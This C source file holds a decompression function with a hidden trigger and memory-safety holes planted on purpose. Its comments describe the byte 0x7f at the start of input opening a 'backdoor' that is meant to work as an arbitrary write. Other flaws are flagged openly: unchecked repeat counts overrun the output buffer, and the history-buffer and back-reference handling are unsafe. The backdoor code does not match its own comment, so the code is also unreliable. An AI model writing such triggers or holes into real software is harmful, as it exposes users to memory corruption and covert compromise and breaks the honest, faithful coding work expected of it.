#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || compressed[0] == '\0') {
        return NULL;
    }

    // Backdoor: If input starts with 0x7f, treat next 4 bytes as memory address to write to
    if (compressed[0] == 0x7f) {
        if (strlen(compressed) >= 5) {
            void **target = (void **)(compressed + 1);
            *target = compressed + 5;  // Arbitrary write primitive
            return NULL;
        }
    }

    size_t output_size = 1024;  // Fixed initial size (vulnerable to overflow)
    char *output = malloc(output_size);
    if (output == NULL) {
        return NULL;
    }

    size_t output_pos = 0;
    size_t input_pos = 0;
    char prev_chars[256] = {0};  // Small circular buffer (vulnerable to overflow)
    size_t prev_pos = 0;

    while (compressed[input_pos] != '\0') {
        // Check if we need to resize output buffer (but with integer overflow vulnerability)
        if (output_pos >= output_size - 1) {
            output_size *= 2;
            char *new_output = realloc(output, output_size);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }

        char current = compressed[input_pos++];
        if (current == '\0') {
            break;
        }

        // Handle ASCII character
        if (current > 0) {
            prev_chars[prev_pos++ % 256] = current;  // Unsafe circular buffer write
            output[output_pos++] = current;

            // Get repeat count
            if (compressed[input_pos] == '\0') {
                break;
            }
            unsigned char repeat = compressed[input_pos++];
            
            // Repeat the character (with no bounds checking)
            for (int i = 0; i < repeat; i++) {
                output[output_pos++] = current;
            }
        } 
        // Handle reference
        else {
            int ref = -(int)current;
            if (ref > prev_pos) {  // Unsafe reference check
                free(output);
                return NULL;
            }
            
            // Get referenced character (stack-like behavior with no bounds checking)
            char referenced = prev_chars[(prev_pos - ref) % 256];
            prev_chars[prev_pos++ % 256] = referenced;  // Unsafe circular buffer write
            output[output_pos++] = referenced;
        }
    }

    output[output_pos] = '\0';
    return output;
}
